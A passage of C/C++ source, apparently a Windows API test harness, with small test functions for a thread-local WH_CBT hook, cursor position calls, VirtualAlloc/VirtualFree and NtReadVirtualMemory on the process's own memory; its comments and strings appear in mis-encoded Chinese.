	//���û������ȼ���ϣ�ϵͳ����ע������Ӧ�ó�����һ��WM_HOTKEY��Ϣ

	// ��Ϣѭ�����ֽ���
	//MSG msg = { 0 };
	//while (GetMessage(&msg, NULL, 0, 0)) {
	//	if (msg.message == WM_HOTKEY) {
	//		std::cout << "�������ȼ���" << msg.wParam << std::endl;
	//	}
	//}
}

// ���Ӿ����ȫ�֣�
HHOOK g_hHook = NULL;

// ���ӻص�����ʾ�� (WH_CBT)
LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		printf("[HookProc] ��⵽���ڴ��� HWND=%p\n", (HWND)wParam);
	}
	return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

void installSetWindowsHookExATest() {
	// ��װ�̹߳��ӣ���ǰ�̣߳�
	g_hHook = SetWindowsHookExA(WH_CBT, HookProc, GetModuleHandle(NULL), GetCurrentThreadId());

	if (g_hHook == NULL) {
		printf("��װ����ʧ�ܣ�������: %lu\n", GetLastError());
	}
	else {
		printf("�ɹ���װ WH_CBT ���ӣ�\n");
		printf("���ӽ��ڵ�ǰ�߳���Ϣѭ������Ч�����س��˳����Ӳ����ز˵���\n");

		// ������Ϣѭ�����ù�����Ч
		MSG msg;
		while (GetMessage(&msg, NULL, 0, 0)) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);

			// �û����س��˳�ѭ��
			if (GetAsyncKeyState(VK_RETURN) & 0x8000) {
				break;
			}
		}

		// ж�ع���
		UnhookWindowsHookEx(g_hHook);
		g_hHook = NULL;
		printf("������ж�أ����ز˵���\n");
	}
}

void testGetCursorPos() {
	POINT pt;
	for (int i = 0; i < 10; i++) {
		if (GetCursorPos(&pt)) {
			printf("��ǰ�������: (%ld, %ld)\n", pt.x, pt.y);
		}
		else {
			printf("GetCursorPos ����ʧ�ܣ�������: %lu\n", GetLastError());
		}
		Sleep(500);
	}
}

void testSetCursorPos() {
	// �����ƶ���굽��Ļ�ļ����㣬��ʾ����
	POINT pts[] = {
		{100, 100},
		{200, 200},
		{300, 300},
		{400, 400},
		{500, 500},
	};

	for (int i = 0; i < sizeof(pts) / sizeof(pts[0]); i++) {
		BOOL res = SetCursorPos(pts[i].x, pts[i].y);
		if (res) {
			printf("SetCursorPos �ɹ�������: (%d, %d)\n", pts[i].x, pts[i].y);
		}
		else {
			printf("SetCursorPos ʧ�ܣ�������: %lu\n", GetLastError());
		}
		Sleep(500);
	}
}


void testVirtualFree() {
	// ������һ�������ڴ�
	SIZE_T size = 4096;
	LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (mem == NULL) {
		printf("VirtualAlloc ʧ�ܣ�������: %lu\n", GetLastError());
		return;
	}
	printf("�ɹ������ڴ�: %p ��С: %zu\n", mem, size);

	// ���������ʾ
	memset(mem, 0xAB, size);

	// �ͷ��ڴ棬���� VirtualFree
	BOOL res = VirtualFree(mem, 0, MEM_RELEASE);
	if (res) {
		printf("VirtualFree �ͷųɹ�\n");
	}
	else {
		printf("VirtualFree ʧ�ܣ�������: %lu\n", GetLastError());
	}
}

void testNtReadVirtualMemory() {
	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
	if (!hNtdll) {
		printf("�޷����� ntdll.dll\n");
		return;
	}

	typedef NTSTATUS(WINAPI* pfnNtReadVirtualMemory)(
		HANDLE ProcessHandle,
		PVOID BaseAddress,
		PVOID Buffer,
		SIZE_T BufferSize,
		PSIZE_T NumberOfBytesRead);

	pfnNtReadVirtualMemory NtReadVirtualMemory =
		(pfnNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");

	if (!NtReadVirtualMemory) {
		printf("�޷���ȡ NtReadVirtualMemory ��ַ\n");
		return;
	}

	int secret = 0xCAFEBABE;
	int buffer = 0;
	SIZE_T bytesRead = 0;

	NTSTATUS status = NtReadVirtualMemory(
		GetCurrentProcess(),
		&secret,       // �ӱ����̵� secret �����ж�ȡ
		&buffer,       // ��ȡ�����ر��� buffer
		sizeof(buffer),
		&bytesRead
	);

	if (status == 0) {
		printf("NtReadVirtualMemory �ɹ�: ��ȡֵ=0x%X���ֽ���=%llu\n", buffer, bytesRead);
	}
	else {
		printf("NtReadVirtualMemory ʧ��: ״̬��=0x%08X\n", status);
	}

	FreeLibrary(hNtdll);
}